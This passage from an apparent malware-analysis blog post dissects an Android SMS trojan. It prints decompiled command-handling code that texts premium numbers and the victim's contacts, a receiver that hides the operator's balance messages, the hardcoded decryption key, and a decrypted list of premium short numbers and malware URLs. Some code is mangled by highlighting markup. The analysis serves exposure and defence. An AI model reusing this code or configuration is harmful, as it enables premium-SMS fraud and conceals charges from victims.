class="hljs-keyword"><span class="hljs-keyword">break</span></span>; localObject3 = ((JSONArray)localObject2).getJSONObject(i); localObject4 = ((JSONObject)localObject3).getString(<span class="hljs-string"><span class="hljs-string">"type"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!((String)localObject4).equals(<span class="hljs-string"><span class="hljs-string">"1"</span></span>)) <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span>; UpdateService.f = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; UpdateReceiver.a(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.a, ((JSONObject)localObject3).getString(<span class="hljs-string"><span class="hljs-string">"to_number"</span></span>), ((JSONObject)localObject3).getString(<span class="hljs-string"><span class="hljs-string">"message"</span></span>)); localObject5 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> n(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.a); localObject7 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> String[<span class="hljs-number"><span class="hljs-number">1</span></span>]; localObject7[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-string"><span class="hljs-string">"1"</span></span>; ((n)localObject5).execute(localObject7); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!((String)localObject4).equals(<span class="hljs-string"><span class="hljs-string">"2"</span></span>)) <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> label742; localObject5 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.aagetContentResolver().query(ContactsContract.Contacts.CONTENT_URI, <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!((Cursor)localObject5).moveToNext()) <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> label650; localObject7 = ((Cursor)localObject5).getString(((Cursor)localObject5).getColumnIndex(<span class="hljs-string"><span class="hljs-string">"_id"</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (((Cursor)localObject5).getString(((Cursor)localObject5).getColumnIndex(<span class="hljs-string"><span class="hljs-string">"has_phone_number"</span></span>)).equalsIgnoreCase(<span class="hljs-string"><span class="hljs-string">"1"</span></span>)) { str2 = <span class="hljs-string"><span class="hljs-string">"true"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!Boolean.parseBoolean(str2)) <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span>; localObject7 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.aagetContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>, <span class="hljs-string"><span class="hljs-string">"contact_id = "</span></span> + (String)localObject7, <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!((Cursor)localObject7).moveToNext()) <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> label640; <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.ajadd(((Cursor)localObject7).getString(((Cursor)localObject7).getColumnIndex(<span class="hljs-string"><span class="hljs-string">"data1"</span></span>))); <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span>; } } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (Exception localException1) { str1 = <span class="hljs-string"><span class="hljs-string">"-100"</span></span>; } str2 = <span class="hljs-string"><span class="hljs-string">"false"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span>; label640: ((Cursor)localObject7).close(); <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span>; label650: ((Cursor)localObject5).close(); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span> j = <span class="hljs-number"><span class="hljs-number">0</span></span>; j &lt; <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.ajsize(); j++) UpdateReceiver.a(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.a, (String)<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.ajget(j), ((JSONObject)localObject3).getString(<span class="hljs-string"><span class="hljs-string">"message"</span></span>)); localObject7 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> n(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.a); Object localObject6 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> String[<span class="hljs-number"><span class="hljs-number">1</span></span>]; localObject6[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-string"><span class="hljs-string">"2"</span></span>; ((n)localObject7).execute(localObject6); label742: <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (((String)localObject4).equals(<span class="hljs-string"><span class="hljs-string">"3"</span></span>)) { localObject6 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(<span class="hljs-string"><span class="hljs-string">"android.intent.action.VIEW"</span></span>, Uri.parse(((JSONObject)localObject3).getString(<span class="hljs-string"><span class="hljs-string">"open_url"</span></span>))); ((Intent)localObject6).addFlags(<span class="hljs-number"><span class="hljs-number">268435456</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.aastartActivity((Intent)localObject6); localObject7 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> n(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.a); localObject6 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> String[<span class="hljs-number"><span class="hljs-number">1</span></span>]; localObject6[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-string"><span class="hljs-string">"3"</span></span>; ((n)localObject7).execute(localObject6); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (((String)localObject4).equals(<span class="hljs-string"><span class="hljs-string">"4"</span></span>)) { UpdateService.a(((JSONObject)localObject3).getString(<span class="hljs-string"><span class="hljs-string">"server_url"</span></span>)); localObject7 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> n(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.a); localObject6 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> String[<span class="hljs-number"><span class="hljs-number">1</span></span>]; localObject6[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-string"><span class="hljs-string">"4"</span></span>; ((n)localObject7).execute(localObject6); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (((String)localObject4).equals(<span class="hljs-string"><span class="hljs-string">"5"</span></span>)) { localObject4 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Notification(<span class="hljs-number"><span class="hljs-number">2130837504</span></span>, ((JSONObject)localObject3).getString(<span class="hljs-string"><span class="hljs-string">"title"</span></span>), System.currentTimeMillis()); localObject6 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(<span class="hljs-string"><span class="hljs-string">"android.intent.action.VIEW"</span></span>, Uri.parse(((JSONObject)localObject3).getString(<span class="hljs-string"><span class="hljs-string">"urlop"</span></span>))); localObject6 = PendingIntent.getActivity(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.aa, <span class="hljs-number"><span class="hljs-number">0</span></span>, (Intent)localObject6, <span class="hljs-number"><span class="hljs-number">0</span></span>); localObject7 = (NotificationManager)<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.aagetSystemService(<span class="hljs-string"><span class="hljs-string">"notification"</span></span>); ((Notification)localObject4).setLatestEventInfo(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.aa, ((JSONObject)localObject3).getString(<span class="hljs-string"><span class="hljs-string">"title"</span></span>), ((JSONObject)localObject3).getString(<span class="hljs-string"><span class="hljs-string">"message"</span></span>), (PendingIntent)localObject6); ((Notification)localObject4).defaults = (<span class="hljs-number"><span class="hljs-number">0x1</span></span> | ((Notification)localObject4).defaults); ((Notification)localObject4).flags = (<span class="hljs-number"><span class="hljs-number">0x10</span></span> | ((Notification)localObject4).flags); ((NotificationManager)localObject7).notify(<span class="hljs-number"><span class="hljs-number">0</span></span>, (Notification)localObject4); } str1++; } } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (Exception localException2) { str1 = <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (String)(String)(String)(String)(String)(String)(String)str1; } }</code> </pre><br></div></div><br><br>  Well, in fact, everything - then you can not disassemble the code, we saw that the emptying of the user's balance is achieved by sending SMS to premium numbers.  However, I came across a couple of interesting moments when I looked through the Trojan code.  For example, incoming SMS from number 111, which is the service number of the MTS, are blocked - thus, the user does not hear anything at all and does not see when his balance gradually goes into minus. <br>  This is done by the <b>MessageReceiver</b> class, here is its definition in AndroidManifest.xml <br><br><pre> <code class="xml hljs"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".MessageReceiver"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:priority</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"1000"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.provider.Telephony.SMS_RECEIVED"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br><br>  It can be seen that he is set to high priority, so he manages to process incoming messages to the device first.  Well, inside the <b>onReceive</b> method, we see that if the SMS comes from number 111, then the intent is intercepted, that is, the broadcast message ends on this handler and does not go further to other applications. <br><br><div class="spoiler">  <b class="spoiler_title">MessageReceiver Code</b> <div class="spoiler_text"><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">package</span></span> net.droid.installer; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.BroadcastReceiver; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.Context; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.Intent; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.SharedPreferences; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.SharedPreferences.Editor; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.os.Bundle; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.preference.PreferenceManager; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.telephony.SmsMessage; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> java.util.regex.Matcher; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> java.util.regex.Pattern; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MessageReceiver</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">BroadcastReceiver</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onReceive</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Context paramContext, Intent paramIntent)</span></span></span><span class="hljs-function"> </span></span>{ Object localObject = paramIntent.getExtras(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (localObject != <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>) { localObject = (Object[])((Bundle)localObject).get(<span class="hljs-string"><span class="hljs-string">"pdus"</span></span>); SmsMessage[] arrayOfSmsMessage = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SmsMessage[localObject.length]; <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (i &lt; arrayOfSmsMessage.length) { arrayOfSmsMessage[i] = SmsMessage.createFromPdu((<span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[])localObject[i]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((arrayOfSmsMessage[i].getOriginatingAddress().contains(<span class="hljs-string"><span class="hljs-string">"111"</span></span>)) || (arrayOfSmsMessage[i].getOriginatingAddress().contains(<span class="hljs-string"><span class="hljs-string">"000100"</span></span>))) { Matcher localMatcher = Pattern.compile(<span class="hljs-string"><span class="hljs-string">"-?\\d+"</span></span>).matcher(arrayOfSmsMessage[i].getDisplayMessageBody()); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (localMatcher.find()) { PreferenceManager.getDefaultSharedPreferences(paramContext).edit().putString(<span class="hljs-string"><span class="hljs-string">"balance"</span></span>, localMatcher.group()).commit(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (arrayOfSmsMessage[i].getDisplayMessageBody().contains(<span class="hljs-string"><span class="hljs-string">"     "</span></span>)) PreferenceManager.getDefaultSharedPreferences(paramContext).edit().putString(<span class="hljs-string"><span class="hljs-string">"balance"</span></span>, <span class="hljs-string"><span class="hljs-string">"-"</span></span> + localMatcher.group()).commit(); abortBroadcast(); } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (UpdateService.f) { abortBroadcast(); UpdateService.f = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; } i++; } } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (Exception localException) { } } } }</code> </pre><br></div></div><br><br>  Another interesting point that actually allows the community to force fraudsters to answer for their actions is the encrypted base, which I mentioned at the beginning of the post.  While viewing the code, it was found out that the file with numbers was encrypted with the Blowfish algorithm in ECB mode.  This is a symmetric encryption algorithm, with a good key it could take years to break into it, but ... the Trojan‚Äôs developers didn‚Äôt bother much: <br><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">final</span></span></span><span class="hljs-function"> String </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">b</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String paramString)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { Object localObject2 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.a.getAssets().open(paramString); Object localObject1 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[((InputStream)localObject2).available()]; ((InputStream)localObject2).read(localObject1); ((InputStream)localObject2).close(); localObject2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SecretKeySpec(<span class="hljs-string"><span class="hljs-string">"3gYX0W0GiIdT0E9y"</span></span>.getBytes(), aa); Cipher localCipher = Cipher.getInstance(<span class="hljs-string"><span class="hljs-string">"t/c/g"</span></span>.replace(<span class="hljs-string"><span class="hljs-string">"t"</span></span>, aa).replace(<span class="hljs-string"><span class="hljs-string">"c"</span></span>, ab).replace(<span class="hljs-string"><span class="hljs-string">"g"</span></span>, ac)); localCipher.init(<span class="hljs-number"><span class="hljs-number">2</span></span>, (Key)localObject2); localObject1 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> String(localCipher.doFinal(localObject1)); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> localObject1; } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (Exception str) { <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) { localException.printStackTrace(); String str = <span class="hljs-string"><span class="hljs-string">"err"</span></span>; } } } }</code> </pre><br><br>  With a known key, I had only to jot down a couple of lines in Java, and the file was decrypted: <br><br><div class="spoiler">  <b class="spoiler_title">Short numbers, billing prefixes and other Trojan settings</b> <div class="spoiler_text"><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">oper</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">number</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">numr</span></span></span><span class="hljs-tag">&gt;</span></span>8503,7202,7201,7201,7201<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">numr</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pref</span></span></span><span class="hljs-tag">&gt;</span></span>1429015599 041 122 6030,1429015599 041 122 6030,1429015599 041 122 6030,1429015599 041 122 6030,1429015599 041 122 6030<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pref</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">mccmnc</span></span></span><span class="hljs-tag">&gt;</span></span>25001<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">mccmnc</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">lock</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">lock</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">isBlocked</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">isBlocked</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">url</span></span></span><span class="hljs-tag">&gt;</span></span>http://mp3-999.com/content<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">url</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutName</span></span></span><span class="hljs-tag">&gt;</span></span>Online<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutName</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutUrl</span></span></span><span class="hljs-tag">&gt;</span></span>http://oxclick.com<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutUrl</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutIcon</span></span></span><span class="hljs-tag">&gt;</span></span>icon<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutIcon</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">number</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">number</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">numr</span></span></span><span class="hljs-tag">&gt;</span></span>7204<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">numr</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pref</span></span></span><span class="hljs-tag">&gt;</span></span>1429015599 041 122 6030<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pref</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">mccmnc</span></span></span><span class="hljs-tag">&gt;</span></span>25002<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">mccmnc</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">lock</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">lock</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">isBlocked</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">isBlocked</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">url</span></span></span><span class="hljs-tag">&gt;</span></span>http://mp3-999.com/content<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">url</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutName</span></span></span><span class="hljs-tag">&gt;</span></span>Online<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutName</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutUrl</span></span></span><span class="hljs-tag">&gt;</span></span>http://oxclick.com<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutUrl</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutIcon</span></span></span><span class="hljs-tag">&gt;</span></span>icon<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutIcon</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">number</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">number</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">numr</span></span></span><span class="hljs-tag">&gt;</span></span>8503,7202,7201,7201,7201<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">numr</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pref</span></span></span><span class="hljs-tag">&gt;</span></span>1429015599 041 122 6030,1429015599 041 122 6030,1429015599 041 122 6030,1429015599 041 122 6030,1429015599 041 122 6030<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pref</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">mccmnc</span></span></span><span class="hljs-tag">&gt;</span></span>25099<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">mccmnc</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">lock</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">lock</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">isBlocked</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">isBlocked</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">url</span></span></span><span class="hljs-tag">&gt;</span></span>http://mp3-999.com/content<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">url</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutName</span></span></span><span class="hljs-tag">&gt;</span></span>Online<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutName</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutUrl</span></span></span><span class="hljs-tag">&gt;</span></span>http://oxclick.com<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutUrl</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutIcon</span></span></span><span class="hljs-tag">&gt;</span></span>icon<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutIcon</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">number</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">number</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">numr</span></span></span><span class="hljs-tag">&gt;</span></span>7202,7201,7201<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">numr</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pref</span></span></span><span class="hljs-tag">&gt;</span></span>1429015599 041 122 6030,1429015599 041 122 6030,1429015599 041 122 6030<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pref</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span 